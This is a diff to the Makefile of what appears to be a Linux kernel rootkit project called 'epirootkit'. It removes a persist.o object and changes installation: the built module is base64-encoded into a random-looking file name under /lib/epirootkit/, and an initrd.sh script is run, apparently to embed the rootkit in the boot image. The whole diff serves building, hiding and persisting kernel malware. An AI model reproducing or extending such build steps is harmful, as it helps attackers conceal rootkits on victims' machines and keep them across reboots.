@@ -46,8 +46,7 @@ epirootkit-objs :=                              \
     interceptor/misc/ghost.o                    \
     utils/io/io.o                               \
     utils/ulist/ulist.o                         \
-    passwd/passwd.o                             \
-    persist/persist.o
+    passwd/passwd.o
 
 all: modules
 
@@ -55,7 +54,8 @@ modules:
 	@./scripts/generate.sh
 	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules
 	@mkdir -p /lib/epirootkit/
-	@install -o root -m 0644 epirootkit.ko /lib/epirootkit/epirootkit.ko
+	@base64 epirootkit.ko > /lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv
+	@./scripts/romance/initrd.sh
 
 clean:
 	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean
